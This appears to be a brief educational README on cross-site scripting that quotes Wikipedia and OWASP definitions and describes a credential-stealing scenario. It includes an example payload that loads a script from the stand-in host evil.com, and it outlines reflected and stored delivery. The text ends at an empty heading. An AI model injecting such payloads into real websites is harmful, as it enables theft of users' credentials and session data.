# what is xss ?
Cross-site scripting is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy. --Wikipedia--

An attacker can use XSS to send a malicious script to an unsuspecting user. The end userâ€™s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. --OWASP--

# how it's work ?
```x.js```, ```x.php```, and ```creds.txt``` stored at evil.com then attacker use xss payload
to your website that vulnerable from xss --> ```<script src=https://evil.com/x.js></script>```

if xss reflected, attacker usually use shortlink to avoid suspicion and make the user of your website click into it
if xss stored, attacker usually just wait for the payload triggered from another user

and this will happen

if the user of your website doesn't aware about security then they just believe it and don't know that was a scam accidentally they send their credential to the evil.com

# is xss just pop-up only ?
